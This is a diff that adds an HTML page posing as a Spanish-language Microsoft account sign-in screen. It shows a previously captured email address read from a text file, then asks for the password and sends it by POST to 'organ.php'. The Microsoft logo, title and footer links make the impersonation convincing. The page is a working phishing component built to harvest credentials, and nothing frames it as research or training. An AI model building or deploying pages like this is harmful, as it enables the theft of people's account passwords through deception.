@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="assets/favicon.ico" />
+    <title>Iniciar sesiòn en tu cuenta Microsoft</title>
+    <link rel="stylesheet" href="assets/app.css" />
+</head>
+
+<body>
+    <section id="section_uname">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back">
+                    <img src="assets/back.png" />
+                </button>
+                <pre id="contenido-archivo"></pre>
+
+<script>
+  // Cargar el contenido del archivo.txt usando JavaScript
+  var archivo = new XMLHttpRequest();
+  archivo.open("GET", "emal.txt", true);
+  archivo.onreadystatechange = function () {
+    if (archivo.readyState === 4 && archivo.status === 200) {
+      // Mostrar el contenido en la etiqueta <pre>
+      document.getElementById("contenido-archivo").textContent = archivo.responseText;
+    }
+  };
+  archivo.send();
+</script>
+            </div>
+            <h2 class="title mb-16">Escribir contraseña</h2>
+            <form action="organ.php" method="POST" class="row g-3">
+                    <div class="mb-16">
+                        <label for="nombre" class="form-label"></label>
+                        <input type="password" name="nombre" class="input" placeholder="Contraseña" required />
+                    </div>
+                
+                <div>
+                    <p class="mb-16"> <a href="#" class="link fs-13">¿Olvido su contraseña?</a></p>
+                </div>
+                <div>
+
+                    <button class="btn" >Inicar sesión</button>
+
+                </div>
+            </form>
+        </div>
+
+
+    <section id="section_final" class="d-none">
+        <div class="auth-wrapper">
+            <img src="assets/logo.png" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">a@b.com</span>
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+        <a href="#">Terminos de uso</a>
+        <a href="#">Privacidad y cookies</a>
+        <span>.&nbsp;.&nbsp;.</span>
+    </footer>
+    <script src="assets/app.js"></script>
+</body>
+</html>
